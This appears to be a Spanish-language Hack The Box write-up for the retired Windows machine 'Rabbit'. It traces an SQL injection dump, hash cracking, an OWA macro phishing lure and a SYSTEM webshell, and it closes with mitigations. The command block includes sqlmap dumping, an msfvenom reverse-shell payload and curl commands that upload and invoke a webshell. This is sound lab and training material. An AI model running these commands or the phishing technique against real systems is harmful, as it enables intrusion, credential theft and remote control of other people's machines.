---
machine: Rabbit
os: Windows
difficulty: Insane
platform: Hack The Box
state: Retired
tags: [windows, sqli, owa, macro, phishing, webshell]
---

# Rabbit — Hack The Box (Windows)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

Una SQLi en Complain Management System vuelca usuarios y hashes. Las credenciales recuperadas permiten entrar a Outlook Web Access y enviar un documento con macros a un usuario, obteniendo una shell. Un webshell en el servidor que corre como SYSTEM cierra la escalada.

## Reconocimiento

```bash
nmap -Pn -sCV -p25,80,443,110,143,3389 <IP>
sqlmap --url "http://rabbit.htb/complain.php?id=1" --batch --dump
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
# OWA y macro
# Enviar documento .docm a un usuario interno
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f exe > payload.exe
# Webshell
curl -X PUT --data-binary @shell.aspx http://rabbit.htb/uploads/shell.aspx
curl http://rabbit.htb/uploads/shell.aspx?cmd=whoami
```

## Enumeración

- Aplicación de quejas con SQLi y hashes de usuarios.
- OWA expuesto y correo interno entre empleados.
- Servidor web con un directorio de escritura y proceso SYSTEM.

## Acceso inicial

La SQLi en la aplicación de quejas filtra la tabla de usuarios y hashes. Se crackean las contraseñas y se accede a OWA; desde allí se envía un documento con macros a una cuenta que lo abre, lo que devuelve una shell.

## Escalada de privilegios

El usuario de la shell enumera el servidor web y encuentra un directorio donde puede escribir. Se coloca un webshell en una ruta ejecutada por el servidor, que corre como SYSTEM, y se obtiene una shell privilegiada.

## Evidencia

- Volcado SQLi con usuarios y hashes.
- Acceso a OWA y macro ejecutada.
- Webshell en el servidor y `whoami` con SYSTEM.

## Lecciones aprendidas

- Las aplicaciones internas también filtran credenciales.
- El correo es un vector de phishing interno creíble.
- Un servidor web como SYSTEM convierte una escritura en root.

## Mitigación y detección

- Parametrizar consultas y proteger hashes.
- Bloquear macros de Internet y filtrar adjuntos.
- Ejecutar el servidor web con una cuenta de bajo privilegio.

## Referencias

- [0xdf — Rabbit](https://0xdf.gitlab.io/2022/04/28/htb-rabbit.html)
- [Microsoft — Macros](https://learn.microsoft.com/en-us/office/vba/library-reference/concepts/getting-started-with-vba-in-office)
- [Hack The Box — Rabbit](https://app.hackthebox.com/machines/rabbit)
